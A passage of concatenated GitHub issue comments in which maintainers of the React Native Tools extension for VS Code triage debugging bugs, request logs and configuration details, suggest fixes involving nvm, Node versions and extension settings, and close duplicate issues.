handler body of (1)\nthe breakpoint on button event handler is working (when you press the button), the one into the render body does not work at all.\n\nExpected Behavior\n\nBreakpoint should work (as in chrome) into the render and onPress handler method\n\nSoftware versions\n\nReact-Native VS Code extension version:  0.6.5 and previous 0.6.4 0.6.3\nVSCode version: latest\nOS platform and version: win7\nNodeJS version: does not matter\n\nReact Native version: 0.54. Hi guys. Seems to be that current issue is a duplicate of https://github.com/Microsoft/vscode-react-native/issues/667, because I tried to reproduce it again with VS Code 1.24 but it has worked without any problem. @FRizzonelli could you please try to update VS Code to 1.24 and reproduce your issue in there? I am closing this one for now, but if your problem will be still persist, feel free to submit another one so we could discuss your specific case.. Hi guys\nCould anyone who experiencing such a problem do the following steps? That would really help us to determine the cause of it:\n\n\nOpen your project on which you have an issue in VS Code. \n\nRe-open VS Code - your project should be opened again (this is important).\nCopy text from Output->Log (Extension Host) and attach it here.\nClick Debug->gear icon, make sure there is no React Native item in the popup menu.\nCopy text from Output->Log (Extension Host) again and attach it here.\n\n. Hi guys, do you still experiencing this issue? . Hi @f3ist Did you try these https://github.com/Microsoft/vscode-react-native/issues/661#issuecomment-385198868, https://github.com/Microsoft/vscode-react-native/issues/661#issuecomment-389438663, https://github.com/Microsoft/vscode-react-native/issues/661#issuecomment-372929835?. Hi guys, could you please check new version 0.6.10 of extension and let us know if it solves current problem?. Hi @joebernard @code-matt \nWhat extensions has been installed on machines on which you are experiencing this problem except React Native Tools?. I still cannot reproduce this on our side even for clean VS Code installation. I am suspecting that the narrowed down activation events underlie this issue. Everyone who is experiencing this problem please try to do the following and report here whether it resolves this issue:\n\nClose all VS Code instances.\nOpen ~/.vscode/extensions/vsmobile.vscode-react-native-0.6.10/package.json (or C:\\Users\\<username>\\.vscode\\extensions\\vsmobile.vscode-react-native-0.6.10\\package.json for Windows) in text editor, replace this lines\n\njs\n    \"activationEvents\": [\n        \"onDebug\",\n        \"workspaceContains:**/node_modules/react-native/package.json\",\n        \"onCommand:reactNative.runAndroidSimulator\",\n        \"onCommand:reactNative.runAndroidDevice\",\n        \"onCommand:reactNative.runIosSimulator\",\n        \"onCommand:reactNative.runIosDevice\",\n        \"onCommand:reactNative.startPackager\",\n        \"onCommand:reactNative.startExponentPackager\",\n        \"onCommand:reactNative.stopPackager\",\n        \"onCommand:reactNative.restartPackager\",\n        \"onCommand:reactNative.publishToExpHost\",\n        \"onCommand:reactNative.showDevMenu\",\n        \"onCommand:reactNative.reloadApp\"\n    ],\nwith\n\"activationEvents\": [\n            \"*\"\n    ],\nand save.\n3. Open VS Code and try to reproduce the issue.. Hi guys, did you try v0.6.11? We have fixed activation event handler which might be the cause of this issue.. @blackinitial propmt won't be shown if you already have created launch.json .. @blackinitial it seems to be a VS Code issue. What version of VS Code do you use?. @WesleydeSouza just a friendly ping on this.. @WesleydeSouza Well, seems to be that your issue doesn't relate with extension itself. I recommend you to search for similar issues in react-native repo, besides there was already bug that caused inability for targeting iPhone 6 in extension as well.\n. Hi guys. We already have https://github.com/Microsoft/vscode-react-native/issues/625 issue so please let's discuss it one place. I am going to close this as duplicate.\n@isurugajasinghe If you are sure that your issue doesn't relate with #625, please submit a new one using our issue template so we could help you faster.. Hi @Gremlin80 I am closing this as duplicate of #659. Also I moved repro steps there too: https://github.com/Microsoft/vscode-react-native/issues/659#issuecomment-374182223.. HI @booker-laputa, I tried to reproduce your issue using the following steps but it works like a charm for me:\n\nInitialize empty RN-project.\nInstall react-native-code-push into it.3.\nUpdate App.js with simple CodePush update logic and add code that throws exception by clicking on a button.\nCompile app in Release mode in XCode and run it.\nRelease new code-push update via extension.\nInstall and apply update for application and then click button to throw exception - application crashes as shown here:\n\n\nDid I miss something when I was trying to reproduce your issue? Could you please double check that you are running your app in Release mode?. @booker-laputa @firofame AppCenter functionality (and CodePush stuff as well) has been moved since 0.6.9 from vscode-react-native extension to the brand new extension vscode-appcenter so please try it instead. If you will be experiencing current issue there as well, please, submit new issue in that repo.. Hi @ctaggart \nDoes issue still take place for you? Did you follow @annakocheshkova's advice? No push, just a friendly ping on this.. @gweizi, does re-setting breakpoints after attached the debugger in VS Code make debugger stop on them? If so then it is #625 . @jiku so simple breakpoints didn't hit in your case?. Hi @RupamShaw. please submit separate issue.. Hi @sramzan @Gatix and sorry for such delayed response. \n@sramzan did @Gatix 's advice help you? Are we good to close this?. I am closing this, feel free to re-open if needed.. Hi @mhamri \nvscode-react-native doesn't control intelisense for react-native anymore. This functionality is the part of VS Code builtin extension now.\nI believe you should file this issue to https://github.com/Microsoft/vscode instead as it's better place for solving it now.. Hi @joshsiegl1 and thanks for your request. It looks very odd, did you log into expo before running debugger?. Hi @shivawu, sorry for delayed response and thanks for your contribution. I synced your changes with master branch and tried to debug simple RN project, but unfortunately seems to be they messing up things in debugger and it fails with the following error:\nError handling data: this.remoteExtension.launch(...).then(...).spread is not a function. \nDo you have any clues why is this happening and how to fix it?. @shivawu Now debugger stuck when I am trying to debug app from upper-level directory with projectLevel setting assigned:\n. Hi @shivawu, check this out: https://github.com/ruslan-bikkinin/socket-error-repro\nTo reproduce issue please do the following:\n1. Clone repo\n2. cd top-dir/testapp\n3. npm i\n4. Open up top-dir directory in VS Code and start Debug iOS debug session.. @shivawu It usually happens when extension has not been loaded by the moment of command call. Seems to be that one of the activationEvents didn't work or you have something wrong in dev environment. Please check that your dev version of extension builds without errors, symlink is created correctly and you have not two versions of extension (dev and from marketplace) installed simultaneously. Just in case you can do the following:\n\nDelete symlink to local extension path.\nRemove extension from VS Code (if exists) and restart Vs Code.\nBuild extension locally and make sure there are no errors occurs.\nCreate symlink to local extension path.\n\nRestart VS Code.. Hi @shivawu, thanks for coming back. I will investigate this and let you know soon about the results.. Hi @shivawu I want to provide you more details to give you a better understanding:\n\n\nPR provided by @iTOYS should solve Cannot read property 'message' of undefined error. Your clues about inconsistency of activation events and onFolderAdded was right. So this PR should fix that behavior.\n\nAfter applying changes from that PR, debugging start working on iOS without any problem on our machines for freshly created project. Are we missing something? You mentioned this hacky method (as we think) in the sense that it breaks debugging process for some cases, so could you please provide us reproduction steps for those cases?. Hi @shivawu \nActually, extension doesn't support workspace settings files like .code-workspace at all, and it supports only .vscode/settings.json file. As far as I know, we didn't get any feedback for this feature to be implemented yet, so we don't have any plans for it for now.\n\n\nMaybe we could just force it to be relative, then that would make things easier as just finding the project file correctly\n\nIt intended to be relative or absolute, because it resolves using path.resolve method, but doesn't support vscode placeholders like ${workspaceRoot}, obviously.\nThere was another issue with running debug from within non React Native project root, but I has fixed it in https://github.com/Microsoft/vscode-react-native/pull/717. \n. Hi @shivawu could you please test new version of extension v0.6.11 and let us know whether you have any other issues with debugging on mac?. Hi @tafelito and thanks for reaching us. Could you please clarify what plugins did you disable? Also any screenshots, code samples that illustrates your problem will be much appreciated.. @tafelito did you follow these instructions from our documentation? If not, please, try to (also no need to disable builtin plugins for typescript and javascript manually in this case).\nPlease let us know if it helps.. Hi again @tafelito. \nI am afraid that I was wrong mentioning about this documentation section because it's seem to be outdated. Actually, vscode-react-native doesn't control intelisense stuff for React Native anymore because it's handled by builtin VS Code extension now. You can check it for yourself by removing React Native Tools extension (as well as Flow Language Support) completely and trying, for example, to call code-hinting or navigating inside RN SDK files - it will work. \nI believe you should file this issue to https://github.com/flowtype/flow-for-vscode or https://github.com/Microsoft/vscode instead as it's better place for solving it now. . Hi @shivawu and thanks for your request. We will add this to our backlog and pick it up in order of priority. . Hi @shivawu I have implemented your request in this PR: #754. Could you please take a look on it and let me know whether it satisfy your needs?. Okay, I am closing this for now as original feature request has been implemented. @shivawu if you think that this feature should be complemented please feel free to submit new issue.. Hi @Elijen @lardissone, I tried to reproduce your issue after updating VS Code to 1.24 but with no success - log points are working without any problem. Please try to update VS Code to 1.24 and let us know whether it solves your issue or not. \nPlease feel free to re-open this if needed.. @annakocheshkova thanks for taking care of tests!. Hi @maxmamis and thanks for your report. It is known issue: https://github.com/Microsoft/vscode-react-native/issues/625 and, currently, we are working for a solution for it.. Hi @MrLoh Could you please share with me your <your_project>/.vscode/settings.json if you have one? Are you trying to debug your project not inside it's root directory but inside upper-level directory?. @MrLoh could you please do the following:\n1. Add \"trace\": \"verbose\" entry to your debug configuration in launch.json, then try to debug your app using this configuration and copy-paste here output of Debug Console window? \n\n\nPlease, share with us content of <your_project>/.vscode/launch.json and point what configuration have you used.\n\n\nList what extensions are you using now?\n. @MrLoh \nThis error is signalizing you that extension couldn't start react-native command. Taking into account this please try do the following:\n\n\nIf you have only one node version installed, please, make sure that react-native-cli package is installed globally for it.\n\n\nAre you using nvm? If you do, please, make sure that node version which you are using now has react-native-cli package installed globally. Generally, If case of nvm node version that is available inside VS Code may differ with the one is available in os terminal. You can check it by calling node -v within VS Code terminal and within global os terminal. If they differs you can make them identical by calling nvm alias default 10.0.0.. @MrLoh \n\nCould you please run which react-native in terminal and paste here the output. \nAre you able to run react-native command in VS Code terminal, for example react-native -v? \nIs everything okay with your user permissions/access rights for VS Code?. @MrLoh You can do it by calling ls -la /Applications/Visual\\ Studio\\ Code.app/ in terminal.. @MrLoh it looks fine to me. Well, the main problem here is that I can't reproduce your issue using exact software you mentioned. Did you try to completely reinstall extension using this steps:\nRemove extension from VS Code.\nClose VS Code.\nRemove ~/.vscode/extensions/vsmobile.vscode-react-native*.\n\nRun VS Code and install extension again?. @MrLoh you can debug the debugger if extension using instructions provided here: https://github.com/Microsoft/vscode-react-native/blob/master/CONTRIBUTING.md#debugging.\nBefore doing this you need to perform steps provided here: \nhttps://github.com/Microsoft/vscode-react-native/blob/master/CONTRIBUTING.md#development-setup. @MrLoh We will try to improve our logging system in next releases. But as for now, unfortunately, the only way to determine the cause of your issue is to debug extension itself on your side. Please let us know if you need any help with that.. Hi again @MrLoh. \nDo you have a global installation of react-native, or react-native-cli? They both create a react-native executable, but they behave differently and only react-native-cli is intended to be a global install.\nAlso, please make sure that local ./node_modules/.bin is not in your PATH.. Hi @ldhios\n\n\nThanks for your feedback, I believe we can add this in our backlog and implement in case of priority. We will keep you posted about it's status.\n\nThat's weird. Are you sure that packager had already been started when you was trying to attach to debugger in VS Code?. @ldhios \nAfter further investigation I realized that extension already have the feature you are looking for.\nTo mimic WebStorm behavior in case of \"Build and Launch application\" option unchecked you need to do the following:\nRun application manually (actually, webstorm warns that it should be done at first). \n\n\nBy the way, you can run application using extension by opening command pallete, typing \"react native run\" and then selecting any command from the list:\n\n* Then attach to the debugger (Click on \"Gear\" icon -> Select \"Attach to packager\" option in drop-down list)\n\nOh, I got it now. You are looking for \"Start/Stop/Restart packager\" commands.\n\nYou can control packager instance that has been started via extension by using those commands. Also, you can track packager status in status bar that is usually placed on the bottom of VS Code window:\n\n\n\nPlease let us know if this information helps you.. Glad to hear that your problem is solved @ldhios. I am closing this.. Hi @nicecatch and thanks for your question. This is a known issue https://github.com/Microsoft/vscode-react-native/issues/625.. Hi @jdnichollsc please try to remove c:\\dev\\app\\android\\app\\build\\ directory and try to debug again.\nPlease let us know, if it helps. . Hi @jackjj12 and thanks for your request.\nCould you please update your issue with Software versions, Outputs (Include if relevant) information and which version of Expo SDK you are using?\nGenerally, this error comes up from Expo, there are several similar bugs already submitted to Expo repo (https://github.com/expo/expo/issues/633, https://github.com/expo/expo/issues/283), please check them out too, you can find some useful information there.. @jackjj12 Could you please start debug, wait for it to fail and then copy-paste text from the following Output windows:\n\nOutput of the Debug Console (View -> Toggle Debug Console):\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):. @jackjj12 \nHere is my demo project that I've prepared using exp init rn708-expo command: https://github.com/ruslan-bikkinin/rn708-expo\nIn order to debug you should do the following:\nClone rn708-expo repo and run npm i inside project directory.\nInstall Expo app on your device/simulator if you haven't done this before (the version of expo app must be supported by expo sdk version that app is using).\nOpen demo project rn708-expo in VS Code.\nStart debugging using Run In Exponent configuration.\n5* If after opening your project in Expo App debugger stuck at [Info] Enable JS Debugging just shake your device/simulator and select 'Debug JS Remotely' to enable debugging. \n\nAccording to logs you have shared, seems to be your project is lacking of 'antd-mobile', 'babel-plugin-module-resolver' and other dependencies. I believe you should run npm i inside root of your app and try to debug again.\nPlease let us know if you have other questions or need help.. Hi @jackjj12 could you please let me know did you have a chance to look at this?. Hi @Tom29 and thanks for reaching us. React Native Tools extension is not responsible for IntelISense for React Native anymore due to VS Code have taken control over it completely. I suggest you to refer your question to VS Code issue tracker as it is a better place for it.. Hi @levani and thanks for you report. \nThis PR that already merged to master should fix this error. Could you please try it on your machine? To do that please follow these steps:\n1. Run these commands:\ngit clone git@github.com:Microsoft/vscode-react-native.git\ncd vscode-react-native\nnpm i\n2. Open vscode-react-native directory in VS Code, click on Debug icon, then select Quick Launch Extension in drop down menu and run it.\n3. Wait for another instance of VS Code to be appeared (it will be named like Extension Development Host...), then open your project in it and try to debug it regular way.\nPlease let us know whether it resolves your issue.. I am closing this due to fix already included in new version v0.6.11. Please, feel free to reopen if needed.. Hi @jas99 and thanks for your feedback. We will discuss your suggestions internally and come back soon.. Hi @peterjuras and thanks for your question.\n\nLaunching the \"Run iOS on Simulator\" target always starts the iPhone 6 simulator\n\nTo start running app extension is using react-native run-ios command. According to official React Native docs, in this case it is standard behavior:\n\nYou can specify the device the simulator should run with the --simulator flag, followed by the device name as a string. The default is \"iPhone 6\". \n\nTo run your app on different simulator you should create .vscode/settings.json file at the root of your project and fill it with the following content:\njson\n{\n    \"react-native.ios.runArguments.simulator\": [\n        \"--simulator\", \"iPhone 7\"\n    ]\n}\nwhere iPhone 7 is the simulator name. To read more about specifying custom arguments for react-native run-* command, please, follow this documentation section.\nPlease let us know whether it helps you or not.. Hi @LingYun and thanks for reaching us. Could you please open your project in XCode, click Product->Clean and try to debug again? Please, let us know whether it helps you. \nAlso, please make sure that you can run your project via react-native run-ios.. @LingYun could you please share with us the whole following logs from VS Code:\n\nOutput of the Debug Console (View -> Toggle Debug Console):\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):\n. Thanks for coming back. Glad to here that your problem has resolved. Please, don't hesitate to ask for a help if you have any other questions/issues regarding usage of the extension. I am closing this.. @DreamwareDevelopment please submit separate issue describing your specific case and using our issue template.. Hi @ncomo11 and thanks for submitting the issue. I will investigate it and come back soon to let you know about the results.. Hi @ncomo11 Extension supports debugging only for windows (UWP) platform. I believe we can add support for WPF as well in the nearest future as we have already did for UWP platform here: https://github.com/Microsoft/vscode-react-native/pull/618/files. . Hi @jas99 could you please update your post with all the information from issue template?. Hi @jas99. I could debug android application remotely over wi-fi using the following steps:\nInstall application on device and run it.\nSet debug server host and port in Dev Settings -> Debug server host & port for device on device pointing to IP-address of my dev machine on which packager has been started.\nStart packager on dev machine.\nOpen application folder in VS Code and run Attach to debugger configuration.\nEnable remote JS debugging in application on device.\n\nCould you please let us know, if it is that what are you looking for? . Hi @jas99 also please take a look at these similar issues: https://github.com/Microsoft/vscode-react-native/issues/324, https://github.com/facebook/react-native/issues/17379. It seems that you are facing the same problem here. In this case I believe that we could close this for now, but feel free to re-open it if none of solutions suggested there would help you.. Hi @rakeshgits well, that's strange. Could you provide to us more details about your case:\n Are you trying to debug android or ios app? What command are you using: Debug iOS/Debug Android or Attach to debugger?\n Could you please share with us directories structure of workspace you opens? For example you can share with us screenshot of Explorer tab just like this one:\n\nIt is important to understand what directories you are opening to reproduce issue on our side.\n* Are you using .vscode/settings.json for your project?. @jas99 thanks for posting this, I just wanted to do the same as you did. :+1: . Hi @rakeshgits \n\n\nI noticed that you specified 0.55.6 version of React Native, but there is no such version of React Native in NPM:\n\nMay be you meant v0.55.4?\n\n\nCould you please, also, add \"trace\": \"verbose\" to Attach to packager task, try to attach to packager and share with us About to download: ... part of the logs in Debug console window. It points what URL debugger uses to download debuggerWorker.js.\n\n\nDoes your project use Haul? If it does, please follow this documentation section to set up your debug configuration for it. if it doesn't, please, make sure that you don't have haul package installed in node_modules.\n. I'm glad to help you. . Hi @LorienOlive, please submit new issue. . Hi @christianmtr and thanks for reporting.\n\nin terminal works fine\n\n\n\nCould you please clarify which terminal you mentioned: system terminal or VS Code terminal? Please make sure that adb works in both terminals. \n\nbut I have all environment paths\n\nBut anyway, could you please run echo $PATH and show us the output? Also, please show where and how did you export environment variables for android sdk?. @christianmtr could you reproduce this issue when running VS Code from terminal?. @christianmtr Where did you set SDK exports: either in .bash_profile or in .bashrc?. Please try to add them to ~/.bash_profile.. No problem, don't hesitate to turn to us for any help with the extension.. Hi @jas99 thanks for submitting this. Does your project use lerna? Could you please share with us directory structure of workspace that you use?. @jas99 Just tried to reproduce issue using lerna project with such project structure:\nProject724/packages/clients/<RN project content here>. I opened Project724 in VS Code, then added .vscode/settings.json file with \"react-native-tools.projectRoot\": \"./packages/clients\" content and could debug my app without any troubles. So, I am waiting for details for your side to be able help you.. @jas99 Actually, on debugger side we are using this \"tricky\" method to read from settings.json because we can't use VS Code api for it. Seems to be that parser comes to catch block due to incorrect json in your case. I believe we can improve this part by providing error report to the user as you suggested. Thanks for pointing to this!. Hi @allforabit I noticed that  you have several errors in Developer Tools console output that caused by other extensions. Could you please try to uninstall those extensions for a while and try to debug your app again?. Also, @2hyjun please share with us list of plugins which you are using.. @2hyjun thanks for clarifications. \n\nI checked README, you guys said I have to set up sourceMap\n\nIt is applicable for projects that are using Typescript.\nCould you please do more steps to help us identify the cause of your problems? The steps are the following:\n\nPlease do what @iTOYS suggested on previous message first and continue to do next steps only if your problem wouldn't be resolved.\nRemove all extensions except React Native Tools.\nShow us dependencies of your project (package.json: dependencies and devDependencies properties content)\nModify .vscode/launch.json by adding \"trace\":\"verbose\" to debug configuration. The result should be similar to this:\njson\n        {\n            \"name\": \"Debug iOS\",\n            \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n            \"type\": \"reactnative\",\n            \"request\": \"launch\",\n            \"platform\": \"ios\",\n            \"sourceMaps\": true,\n            \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n            \"trace\": \"verbose\" //here\n        },\nTry to debug your app again and copy-paste all outputs from first message:\nOutput of the Debug Console (View -> Toggle Debug Console):\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):. Hi @2hyjun I was able to reproduce the issue using information you provided. Now I am investigating what could cause it so I'll keep you posted about the results.. Hi again @2hyjun\nThis is a know issue with Metro bundler that affects 0.54.x versions of React Native and it should have been fixed via this PR #663. Then there were only 3 versions in 0.54.x branch but since that day two more versions have been released. So, this PR #742 should fill all the gaps.. Hi @tianjyan and thanks for submitting it. \nThe cause of the issue is that extension debugger spawns debugger worker from within node process and worker inherits all globals from it, especially process.versions. \nApp, in its turn, depends on js-md5 package which is md5 implementation for JS. This package tries to detect whether it is started in node or not by checking process.versions variable: if it exists then it \"thinks\" that it is started in node and falls back to use crypto core module which is unavailable in React Native runtime because it uses pure JS engine to run JS code (not necessarily node). That's why error happens.\nI've fixed it in https://github.com/Microsoft/vscode-react-native/pull/748 so as soon as it will be merged and new version will be released you are good to go to use extension debugger for this project. We are going to release new version on this week.. Hi @danielDevelops and thanks for submitting the issue. Did you try to debug your application using Chrome Dev Tools? Please, compare time spent for responding from app to debugger using both React Native Tools extension and Chrome Dev Tools and show us the results.\n\nThe main point here is to make sure that it isn't an application specific problem, e.g. if measured results will be approximately the same then it is.. @danielDevelops thanks for your answer. Could you please provide us minimal demo application so we could reproduce it on our side? It could be simplest application that uses local sqlite storage but including information about breakpoints positions on which debugger is getting slower.. Hi @danielDevelops did you have a chance to look at at this?. @danielDevelops I tried to reproduce your problem using test application from react-native-sqlite-2 repo. I modified it by forcing it to make 50 insert queries on each app start and add two breakpoints: one - before SQL commands execution and second - after it. In all cases debugger responded very quickly, delay took less then 1 second. \nPlease, give us more details about your problem - a demo project with instructions where should we set breakpoints would be the best way to help us identify the cause of your problem. As for now, without any feedback from you it's hard to say what is going wrong.. I am closing this due to inactivity. @danielDevelops please feel free to reopen it if you will be ready to prepare demo application that could help us to reproduce it on our side.. Hi @dominictwlee what directory do you open? Is it root of react native project?\n. @dominictwlee that's insteresting. Could you please try to run any extension command that leads to error and paste here Debug Console output?. @dominictwlee I could reproduce your problem by installing react-native package (not react-native-cli!) globally and then by executing React Native > Run Packager command. In this case:\n1. Please, check that you have installed react-native-cli package globally, not react-native.\n2. If you are using nvm, please check that node versions that are available in VS Code and in system terminal are the same. Sometimes that could be a root of problems.\nPlease let us know if it helps you.. @dominictwlee could you please show screenshot of your project opened in VS Code after error being occured?. @dominictwlee What extensions, among React Native Tools, do you have installed?. @dominictwlee what is the full path to package.json file? Seems to be that problem line is \nhttps://github.com/Microsoft/vscode-react-native/blob/2c82a3f990836260c11640db528a30590867bb8a/src/common/reactNativeProjectHelper.ts#L25\nand fs.existsSync method in your case unexpectedly returns false.\nIt is hard to say what's wrong in your particular case, so the only thing that I can suggest you is to try to debug extension itself on your side.\nThe instructions for that are the following:\n\nRun these commands in terminal: \ngit clone https://github.com/Microsoft/vscode-react-native.git\ncd vscode-react-native\nnpm i -g gulp && npm i\nOpen extension project in VS Code, then run Quick Extension + Debugger debug configuration:\n. \nIt should start new VS Code instance and debugger for the extension. You should see message like  [/media/rbikkinin/work/projects/vscode-react-native]: Overwriting extension /home/rbikkinin/.vscode/extensions/vsmobile.vscode-react-native-0.6.13 with /media/rbikkinin/work/projects/vscode-react-native..\nSet breakpoint at vscode-react-native/src/common/reactNativeProjectHelper.ts:25\nIn just opened VS Code instance open you app directory and execute Run Packager command.\nWait until breakpoint being hit and try to find out why your problem happens.. @dominictwlee Did you restart vscode after 1, 2 steps? Seems to be that it couldn't find quick-build task, that is defined in gulpfile.js. You can check whether it exists by clicking Tasks -> Run tasks... and wait a little bit for VSCode processing.. @dominictwlee You can try to remove node_modules/.bin folder.. @dominictwlee Also you can try to set default node version by executing nvm alias default NEEDED_VERSION. In some cases like yours that could be the cause.. @dominictwlee No exactly, I use nvm as well during my development on Ubuntu including debugging RN apps and extension - just in your particular case something goes wrong. Could you please do the following:\nrun nvm ls in system terminal and in VS Code integrated terminal and show us the output?\nrun cat ~/.npmrc, cat ~/.bashrc, cat ~/.bash_profile and show us the output?. @dominictwlee all seems to be in order here. How do you run VS Code? Could you please try to run it from terminal via code and let us know if issue still persists?\nAlso, please, make sure that you have no remains of another node instances in your path which have been installed not via nvm (potential directories are /usr/bin, usr/local/bin and so on).. @dominictwlee I think that this is mostly vscode and nvm issue rather than extension one, because all we do in extension that is lead to the problem you described in first post is running a react-native -v command by childProcess.spawn(\"react-native\",[\"-v\"], { cwd: YOUR_RPOJECT_DIRECTORY }) . In your case it fails because seems to be that there is no available react-native command in PATH. I have no clues for now, why nvm doesn't work in your case, I'd recommend you to do the following steps that I did when I was trying to make nvm works on my machine:\nRemove nvm and any other node instances that could be installed.\nInstall nvm\nRun the following commands in system terminal, considering that v10.4.0 is your main node version:\nnvm install v10.4.0\nnvm use v10.4.0\nnvm alias default v10.4.0\nInstall other node versions via nvm if needed. @dominictwlee do you have a chance to look at it?. @dominictwlee could you please submit issue in vscode repo and share the link here? As soon as you've done that, I'll join to discussion there.. @dominictwlee I am going to close this due to you already have an issue in vscode and we still don't have any strong evidence that the extension causes your problem. Also, please take a look at my recent comment https://github.com/Microsoft/vscode/issues/56890#issuecomment-436650669.. Hi @rmrudro and thanks for questioning. Are you facing this issue when running react-native run-android? . Seems to be that something wrong directly with your react-native project and it's not related with React Native Tools extension. I believe that a better place for discussing such kind of problems is react-native repo. \nI am closing this issue, please, feel free to re-open if needed.. Hi @LK and thanks for submitting the issue. Could you please give us more details of your scenario so we could reproduce it on our side? So you are doing the following:\nOpen workspace that has RN project root inside.\nMake sure you have a correct debug configuration for this project.\nConfigure your app in release mode to be able to crash it (unintentionally or not).\nStart debugging your app using extension.\nGet your app crashed.\nSee error log in debug console and tap a file in the resulting stack trace.\nA new VS Code window opens, but it shouldn't though.\n\nIs that correct?. Hi again @LK, it seems to be a VS Code issue, because I could reproduce it not using extension at all. In my case reproduction steps were the following:\n* My demo project is called i757.\n1. Set REACT_EDITOR environment variable to code (I did it by executing export REACT_EDITOR=code)\n2. Start packager inside your project directory (i757) and run application (react-native run-ios or react-native run-android - I test it on android app)\n3. Open workspace root including i757 directory. My setup:\n\n4. When app crashes click on a line of the stacktrace.\nAs a result, I got this in packager output:\nOpening /media/rbikkinin/work/support/vscode-react-native/i757/node_modules/react-native/Libraries/ReactNative/AppRegistry.js with code\n and then new VS Code window was opened.\nSo, my guess is that VS Code cannot correctly handle this situation in two conditions:\n1. Command code /path/to/file was executed in parent process (by using node spawn for example).\n2. Workspace multiroot that contains path to file is opened in VS Code instead of one root directory.\nI believe we should address this to vscode folks.. Hi again @stevefan1999. We had to undo PR #760 with a fix because it unexpectedly brake stdio communication between debuggee process and debugger. Originally, your issue caused by this one https://github.com/nodejs/node/issues/21671 and I think, that it will be fixed in upcoming 10.10 release of Nodejs. So, as for now to avoid this error, change system nodejs version to 10.5 or lower.. Hi @sregg and thanks for submitting the issue. Yes, you are right, extension doesn't support yet such scenarios.\n\nWould it be possible to have a param of the reactnative launch type that would specify the build configuration?\nIf that makes sense, I'd be happy to send a PR with that change.\n\nYes, sure, we'd love to get such a contribution. Please, don't hesitate to ask us if you need any help.  . Hi @lrkwz and thanks for your contribution for React Native Tools! I've left a comment on your PR, so please take a look if you have time.. Hi @freakinruben, we are going to release new version at the beginning of the next week. I'll keep you posted.. Hi @soeasyjx, we tried to reproduce you issue on Ubuntu for android platform and on MacOs for iOS platform using demo application created with react-native init for 0.55.4 and latest version of React Native. In all cases debugging worked without any problem. Could you please also fill these sections of issue template to give us more information about your case:\nSoftware versions\n\nOS platform and version: \n\nOutputs (Include if relevant)\n\nOutput of the Debug Console (View -> Toggle Debug Console):\nPASTE OUTPUT HERE\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nPASTE OUTPUT HERE\nOutput of the Developer Tools console (Help -> Toggle Developer Tools -> Select Console tab):\nPASTE OUTPUT HERE\n?. @soeasyjx do you have a chance to look at this?. I am closing this for now. Please feel free to reopen it if needed.. Hi @buddhamangler and thanks for questioning. \n\nRegarding 1, 3, 5: \nPlease, add \"trace\": \"verbose\" to your \"Debug iOS on Device\" configuration and try again debugging your app. You will get extra logging output in these output channels:\nOutput of the Debug Console (View -> Toggle Debug Console):\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox):\nso please, share it with us.\nIn addition, could you please try debugging on simulator and let us know whether you still have such problems on it.\nAlso, please clarify what Mac are you using for testing, does it have HDD or SDD drive?\nRegarding question 2: could you please describe the full step by step scenario?\n. Hi @hkirk and thanks for reaching us. Are you sure that you are turning to the correct repo? Seems to be this is general VS Code/Typescript) issue, not React Native Tools extension one. I believe vscode tracker is a better place for addressing it.. Hi @WasserEsser and thanks for submitting the issue. This issue has been resolved in v0.6.14. However we already have similar one https://github.com/Microsoft/vscode-react-native/issues/758, so I am going to close it for now. Please feel free to leave feedback there if problem still persists.. hi @reza7rm, please see https://github.com/Microsoft/vscode-react-native/issues/777#issuecomment-417359982. Hey guys, we\u2019ve shipped new version of extension v0.6.15 with a fix, please try it out, we are sorry for inconvenience.\nLet me know if you see any issues with latest version.. Hey guys, I\u2019m really sorry for this things happened, I\u2019ve reverted recent changes which broke us for now and created v0.6.16. We\u2019ll investigate and test all the things carefully again but for now things should work as usual. Again I apologise for this, will do our best to prevent such things in future.. Hi @kryptonian41 please see this comment https://github.com/Microsoft/vscode-react-native/issues/758#issuecomment-417267137. \n;TLDR This is a nodejs issue, use nodejs v10.5 or lower to avoid it until v10.10 will be released.. Hi @msnikhil, could you please submit separated issue? I am guessing that your problem is not connected with the one being discussed in this thread.. Hi guys, we just released v0.6.17 that included all the fixes for given problems and get back changes reverted from 0.6.14-0.6.15. That's why I am going to close this issue, so if problem is still persists for anybody (it shouldn't though) please submit new issue.. Hi @soeasyjx and sorry for delayed response. Could you please try to replace\"platform\": \"android\" with \"platform\": \"exponent\" in your debug configuration in launch.json and let us know if it works.. @soeasyjx according to screenshots you posted your project is an Expo one. If you want to debug Expo application on android, you need, at first, install expo app on your android simulator, then start debugging in VS Code using \"platform\": \"exponent\". Once the packager starts, the extension will open a separate tab with QR code to scan from the Exponent app. Once you do so, the Exponent app will connect to the packager and begin running your app. Please, follow this documentation section for more info. \nPlease, try to debug expo app using proper way for such kind of applications by following documentation section above and if it won't help please do the following:\n* Prepare demo project so we could reproduce it on our side. We are asking for this, because, seems to be that your project uses different stuff like lerna, typescript, expo and has specific configurations which makes it too difficult for us to recreate the similar one. You can use your current project, but without any important business logic and other personal information. Please, try to keep it as simple as possible. Please, do not remove your configs and keep directory structure!\nI am looking forward to hearing from you.. @macaetano thanks for reaching us. Please, try updating to v0.6.16, versions v0.6.14-v0.6.15 are broken.. @Sterlingryan could you please copy-paste output of View -> Output -> React-Native: Run Android channel and content of your-project-path/android/local.properties.. Hey guys, I confirm that this is a bug that impact users on Windows targeting android apps, and I am working on a fix now. As workaround, you can comment sdk.dir=your-value string in android/local.properties file and set ANDROID_HOME environment variable for now.. Hi @geocachingsyntaxerror and thanks for reporting. I believe, that something has been broken between 1.25 and 1.26 versions of VS Code, because I couldn't reproduce it in 1.25. I will investigate it and let you know about the results.. Hi @tavrez as first step we have added pallete command to start React Dev Tools in the extension and it will be included in upcoming 0.6.19 version. . Hi @edzillion and thanks for reaching us. Is this application the one you are using? If so, please let us know if we should try to reproduce your issue being directly on master branch or on some specific commit?. Hi @jlubeck and thanks for the suggestion, we will.. Hi @zenz and thanks for reaching us. Looks like we already have similar 